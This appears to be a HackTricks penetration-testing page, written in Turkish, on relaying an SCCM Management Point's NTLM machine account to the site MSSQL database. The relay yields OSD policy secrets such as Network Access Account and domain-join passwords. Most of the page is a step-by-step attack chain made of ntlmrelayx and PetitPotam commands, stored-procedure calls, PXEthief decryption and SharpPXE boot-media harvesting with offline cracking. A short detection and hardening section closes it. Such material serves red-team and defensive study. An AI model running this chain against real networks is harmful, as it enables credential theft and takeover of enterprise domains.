# SCCM Management Point NTLM Relay to SQL – OSD Policy Secret Extraction

{{#include ../../banners/hacktricks-training.md}}

## TL;DR
Bir **System Center Configuration Manager (SCCM) Management Point (MP)**'i SMB/RPC üzerinden kimlik doğrulamaya zorlayıp bu NTLM makina hesabını **relaying** yaparak **site veritabanı (MSSQL)** üzerinde `smsdbrole_MP` / `smsdbrole_MPUserSvc` haklarını elde edersiniz. Bu roller, **Operating System Deployment (OSD)** politika blob'larını (Network Access Account kimlik bilgileri, Task-Sequence değişkenleri vb.) açığa çıkaran bir dizi stored procedure çağırmanıza olanak verir. Bu blob'lar hex-encoded/encrypted durumdadır ancak **PXEthief** ile decode ve decrypt edilerek düz metin sırlar elde edilebilir.

Yüksek seviye zincir:
1. MP ve site DB'yi keşfet ↦ kimlik doğrulaması gerektirmeyen HTTP endpoint `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
2. Başlat `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
3. MP'yi **PetitPotam**, PrinterBug, DFSCoerce, vb. kullanarak zorla.
4. SOCKS proxy üzerinden relayed **<DOMAIN>\\<MP-host>$** hesabı olarak `mssqlclient.py -windows-auth` ile bağlan.
5. Çalıştır:
* `use CM_<SiteCode>`
* `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (veya `MP_GetPolicyBodyAfterAuthorization`)
6. `0xFFFE` BOM'u çıkar, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.

`OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password` gibi sırlar PXE'ye veya istemcilere dokunmadan kurtarılır.

---

## 1. Kimlik doğrulaması gerektirmeyen MP uç noktalarını listeleme
MP ISAPI uzantısı **GetAuth.dll** kimlik doğrulaması gerektirmeyen birkaç parametre sunar (site PKI-only olmadıkça):

| Parameter | Purpose |
|-----------|---------|
| `MPKEYINFORMATIONMEDIA` | Site imzalama sertifikasının açık anahtarını ve *x86* / *x64* **All Unknown Computers** cihazlarının GUID'lerini döner. |
| `MPLIST` | Sitedeki her Management-Point'i listeler. |
| `SITESIGNCERT` | Primary-Site imzalama sertifikasını döndürür (site sunucusunu LDAP olmadan tanımlamak için). |

İlerideki DB sorguları için **clientID** olarak kullanılacak GUID'leri alın:
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```
---

## 2. MP makine hesabını MSSQL'e Relay et
```bash
# 1. Start the relay listener (SMB→TDS)
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
-u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
coercion tetiklendiğinde şu gibi bir şey görmelisiniz:
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```
---

## 3. OSD politikalarını saklı yordamlar aracılığıyla belirleyin
SOCKS proxy üzerinden bağlanın (varsayılan olarak port 1080):
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
3 haneli site kodunu kullanarak **CM_<SiteCode>** DB'ye geçin (örn. `CM_001`).

### 3.1  Unknown-Computer GUID'lerini Bulma (isteğe bağlı)
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```
### 3.2  Atanmış politikaları listele
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
Her satır `PolicyAssignmentID`, `Body` (hex), `PolicyID`, `PolicyVersion` içerir.

Focus on policies:
* **NAAConfig**  – Network Access Account kimlik bilgileri
* **TS_Sequence** – Task Sequence değişkenleri (OSDJoinAccount/Password)
* **CollectionSettings** – run-as accounts içerebilir

### 3.3  Tam body'yi alma
Zaten `PolicyID` & `PolicyVersion`'a sahipseniz clientID gerekliliğini şu şekilde atlayabilirsiniz:
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> ÖNEMLİ: SSMS'te “Maximum Characters Retrieved” (>65535) değerini artırın, aksi takdirde blob kırpılacaktır.

---

## 4. Decode & decrypt the blob
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
Kurtarılan sırların örneği:
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```
---

## 5. İlgili SQL rolleri & prosedürler
Relay yapıldığında login şu rollere eşlenir:
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

Bu roller onlarca EXEC permissions açığa çıkarır; bu saldırıda kullanılan ana olanlar şunlardır:

| Saklı Yordam | Amaç |
|------------------|---------|
| `MP_GetMachinePolicyAssignments` | Bir `clientID`'ye uygulanan politikaları listeler. |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Tam politika içeriğini döndürür. |
| `MP_GetListOfMPsInSiteOSD` | `MPKEYINFORMATIONMEDIA` yolu tarafından döndürülür. |

Tam listeyi şu komutla inceleyebilirsiniz:
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
AND  pe.permission_name='EXECUTE';
```
---

## 6. PXE boot media harvesting (SharpPXE)
* **PXE reply over UDP/4011**: PXE için yapılandırılmış bir Distribution Point'e PXE önyükleme isteği gönderin. proxyDHCP yanıtı `SMSBoot\\x64\\pxe\\variables.dat` (şifrelenmiş config) ve `SMSBoot\\x64\\pxe\\boot.bcd` gibi önyükleme yollarını ve isteğe bağlı bir şifrelenmiş anahtar blob'unu ortaya çıkarır.
* **Retrieve boot artifacts via TFTP**: dönen yolları kullanarak `variables.dat`'ı TFTP üzerinden (kimlik doğrulamasız) indirin. Dosya küçük (birkaç KB) ve şifrelenmiş medya değişkenlerini içerir.
* **Decrypt or crack**:
- Yanıt şifre çözme anahtarını içeriyorsa, anahtarı **SharpPXE**'e vererek `variables.dat`'ı doğrudan çözün.
- Anahtar sağlanmamışsa (PXE medyası özel bir parola ile korunuyorsa), SharpPXE çevrimdışı kırma için Hashcat uyumlu `$sccm$aes128$...` hash'ini üretir. Parolayı kurtardıktan sonra dosyayı çözün.
* **Parse decrypted XML**: düz metin değişkenler SCCM dağıtım meta verilerini (**Management Point URL**, **Site Code**, medya GUID'leri ve diğer tanımlayıcılar) içerir. SharpPXE bunları ayrıştırır ve takip eden kötüye kullanım için GUID/PFX/site parametreleri önceden doldurulmuş çalıştırmaya hazır bir **SharpSCCM** komutu yazdırır.
* **Requirements**: yalnızca PXE dinleyicisine (UDP/4011) ve TFTP'ye ağ erişimi gerekir; yerel admin ayrıcalıkları gerekli değildir.

---

## 7. Tespit & Sertleştirme
1. **MP oturumlarını izle** – ev sahibi olmayan bir IP'den oturum açan herhangi bir MP bilgisayar hesabı ≈ relay.
2. Site veritabanında **Extended Protection for Authentication (EPA)**'yı etkinleştirin (`PREVENT-14`).
3. Kullanılmayan NTLM'i devre dışı bırakın, SMB signing'i zorunlu kılın, RPC'yi kısıtlayın (PetitPotam/PrinterBug'a karşı kullanılan aynı mitigasyonlar).
4. MP ↔ DB iletişimini IPSec / mutual-TLS ile güçlendirin.
5. **PXE maruziyetini sınırlandırın** – UDP/4011 ve TFTP'yi güvenilen VLAN'lara yönelik olarak firewall'layın, PXE parolaları zorunlu kılın ve `SMSBoot\\*\\pxe\\variables.dat` dosyasının TFTP üzerinden indirilmesine karşı uyarı oluşturun.

---

## Ayrıca bakınız
* NTLM relay temelleri:

{{#ref}}
../ntlm/README.md
{{#endref}}

* MSSQL kötüye kullanım & post-exploitation:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}



## Referanslar
- [I’d Like to Speak to Your Manager: Stealing Secrets with Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
- [SharpPXE](https://github.com/leftp/SharpPXE)
{{#include ../../banners/hacktricks-training.md}}
